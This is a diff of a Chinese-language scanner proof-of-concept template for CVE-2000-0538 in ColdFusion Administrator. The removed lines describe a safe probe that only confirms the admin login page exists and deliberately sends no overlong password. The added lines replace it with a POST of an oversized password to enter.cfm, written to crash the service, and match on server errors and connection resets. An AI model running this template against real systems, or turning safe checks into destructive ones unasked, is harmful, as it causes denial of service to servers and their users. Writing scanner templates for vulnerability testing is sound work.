@@ -1,8 +1,8 @@
 [info]
-author = "ave"
-description = "安全检测 Allaire ColdFusion Administrator 登录页是否存在。若响应包含 PasswordProvided 表单字段且非 CF5.0 特征，则可能受 CVE-2000-0538 影响（超长密码可导致 DoS）。本 PoC 仅探测管理登录页存在性，不发送超长密码，不触发拒绝服务。"
+author = "AVE"
+description = "通过向ColdFusion Administrator登录页面的密码字段提交超长字符串，导致服务进程崩溃，验证拒绝服务漏洞的存在"
 id = "POC-AVE-2000-0443"
-name = "ColdFusion Administrator 登录页长密码 DoS 检测"
+name = "Allaire ColdFusion Server 管理员登录密码拒绝服务漏洞 PoC"
 severity = "medium"
 tags = [
     "cve-2000-0538",
@@ -15,44 +15,28 @@ vuln_id = [
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}/CFIDE/administrator/index.cfm"
+method = "POST"
+path = "/{{BaseURL}}/CFIDE/administrator/enter.cfm"
 protocol = "http"
 
+[poc.requests.body]
+content = "adminpassword={{long_password}}"
+type = "raw"
+
 [poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
 User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = ["PasswordProvided"]
-
-[[poc.requests.matchers]]
-expect = false
-part = "body"
-type = "word"
-words = ["cf50"]
-
-[[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}/cfide/administrator/index.cfm"
-protocol = "http"
-
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = ["PasswordProvided"]
-
-[[poc.requests.matchers]]
-expect = false
-part = "body"
-type = "word"
-words = ["cf50"]
+words = [
+    "500",
+    "Internal Server Error",
+    "Service Unavailable",
+    "Connection Reset",
+]
